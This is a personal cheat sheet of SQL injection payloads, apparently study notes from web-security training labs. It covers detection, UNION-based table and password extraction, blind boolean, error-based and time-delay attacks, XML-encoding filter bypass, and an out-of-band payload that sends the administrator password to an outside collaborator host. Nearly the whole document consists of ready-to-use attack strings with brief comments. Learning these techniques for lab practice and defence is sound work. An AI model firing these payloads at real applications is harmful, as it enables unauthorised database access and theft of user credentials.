```js
SQL injection (SQLi) is a web security vulnerability that allows an attacker to interfere with the queries that an application makes to its database. This can allow an attacker to view data that they are not normally able to retrieve.
- Passwords.
- Credit card details.
- Personal user information.
```

# how to detect 
```js
- The single quote character `'` and look for errors or other anomalies.
- Some SQL-specific syntax that evaluates to the base (original) value of the entry point, and to a different value, and look for systematic differences in the application responses.
- Boolean conditions such as `OR 1=1` and `OR 1=2`, and look for differences in the application's responses.
- Payloads designed to trigger time delays when executed within a SQL query, and look for differences in the time taken to respond.
- OAST payloads designed to trigger an out-of-band network interaction when executed within a SQL query, and monitor any resulting interactions.
```

# check which database then exploit accordingly 
```sql
# ORACLE
> check
'+UNION+SELECT+BANNER,+NULL+FROM+v$version--
> exploit
'+UNION+SELECT+'abc','def'+FROM+dual--
'+UNION+SELECT+table_name,NULL+FROM+all_tables--
'+UNION+SELECT+column_name,NULL+FROM+all_tab_columns+WHERE+table_name='USERS_ABCDEF'-- #(replacing the table name)
'+UNION+SELECT+USERNAME_ABCDEF,+PASSWORD_ABCDEF+FROM+USERS_ABCDEF-- (replacing the table and column names)

# non-Oracle databases
> check
'+UNION+SELECT+'abc','def'-- 
> exploit
'+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables--
'+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='users_abcdef'-- #(replacing the table name)
'+UNION+SELECT+username_abcdef,+password_abcdef+FROM+users_abcdef--
# (replacing the table and column names)

# MICROSOFT
'+UNION+SELECT+@@version,+NULL#


```

# SQL injection UNION attack, determining the number of columns returned by the query

```sql
1. Continue adding null values until the error disappears and the response includes additional content containing the null values.
'+UNION+SELECT+NULL,NULL--

2. SQL injection UNION attack, finding a column containing text
'+UNION+SELECT+NULL,NULL,NULL--
Try replacing each null with the random value
If an error occurs, move on to the next null and try that instead
'+UNION+SELECT+'abcdef',NULL,NULL--

3. SQL injection UNION attack, retrieving data from other tables
'+UNION+SELECT+'abc','def'--
'+UNION+SELECT+username,+password+FROM+users--

4. SQL injection UNION attack, retrieving multiple values in a single column
'+UNION+SELECT+NULL,'abc'--
'+UNION+SELECT+NULL,username||'~'||password+FROM+users--
```

# Blind SQL injection with conditional responses
```sql
TrackingId=xyz' AND '1'='1
TrackingId=xyz' AND '1'='2
# verify if response changes something in return
# find users table exist
TrackingId=xyz' AND (SELECT 'a' FROM users LIMIT 1)='a
TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator')='a

# find that user password length
TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a
TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>2)='a
TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>3)='a
if password length is not greater than provided number response will be diffrent. its previous value will be password length

# brute force password attack
TrackingId=xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a
TrackingId=xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='§a§
TrackingId=xyz' AND (SELECT SUBSTRING(password,2,1) FROM users WHERE username='administrator')='a
```

# Blind SQL injection with conditional errors
```sql
TrackingId=xyz'
rackingId=xyz''
if error disappears

confirming
TrackingId=xyz'||(SELECT '')||'
TrackingId=xyz'||(SELECT '' FROM dual)||'
confirming

try selecting non existing table
TrackingId=xyz'||(SELECT '' FROM not-a-real-table)||'

TrackingId=xyz'||(SELECT '' FROM users WHERE ROWNUM = 1)||'
TrackingId=xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'
TrackingId=xyz'||(SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'

TrackingId=xyz'||(SELECT CASE WHEN LENGTH(password)>1 THEN to_char(1/0) ELSE '' END FROM users WHERE username='administrator')||'
TrackingId=xyz'||(SELECT CASE WHEN LENGTH(password)>2 THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
TrackingId=xyz'||(SELECT CASE WHEN LENGTH(password)>3 THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
condition stops being true (i.e. when the error disappears),

TrackingId=xyz'||(SELECT CASE WHEN SUBSTR(password,1,1)='§a§' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
TrackingId=xyz'||(SELECT CASE WHEN SUBSTR(password,2,1)='§a§' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
```

# Visible error-based SQL injection
```sql
TrackingId=ogAZZfxtOKUELbuJ'
In the response, notice the verbose error message. This discloses the full SQL query, including the value of your cookie.

TrackingId=ogAZZfxtOKUELbuJ'--

TrackingId=ogAZZfxtOKUELbuJ' AND CAST((SELECT 1) AS int)--
TrackingId=ogAZZfxtOKUELbuJ' AND 1=CAST((SELECT 1) AS int)--
TrackingId=ogAZZfxtOKUELbuJ' AND 1=CAST((SELECT username FROM users) AS int)--
TrackingId=' AND 1=CAST((SELECT username FROM users) AS int)--
TrackingId=' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--
TrackingId=' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--
```

# Blind SQL injection with time delays
```sql
TrackingId=x'||pg_sleep(10)--
if request wait for 10 sec then procceds yeah it vuln

TrackingId=x'%3BSELECT+CASE+WHEN+(1=1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--

TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--

TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+LENGTH(password)>1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--

TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+LENGTH(password)>2)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+LENGTH(password)>3)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
if this condition is not longer true. there will be error. and its previous value will be password length

TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,1,1)='a')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,1,1)='§a§')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--

note : send one request at time or the result will not be correct 
```

# Blind SQL injection with out-of-band interaction

```sql
replace your domain
TrackingId=x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//BURP-COLLABORATOR-SUBDOMAIN/">+%25remote%3b]>'),'/l')+FROM+dual--
if got the response

TrackingId=x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//'||(SELECT+password+FROM+users+WHERE+username%3d'administrator')||'.BURP-COLLABORATOR-SUBDOMAIN/">+%25remote%3b]>'),'/l')+FROM+dual--

```

# SQL injection with filter bypass via XML encoding
```xml
<storeId>1+1</storeId>
<storeId>1 UNION SELECT NULL</storeId>
**Extensions > Hackvertor > Encode > dec_entities/hex_entities**.
<storeId><@hex_entities>1 UNION SELECT username || '~' || password FROM users</@hex_entities></storeId>
```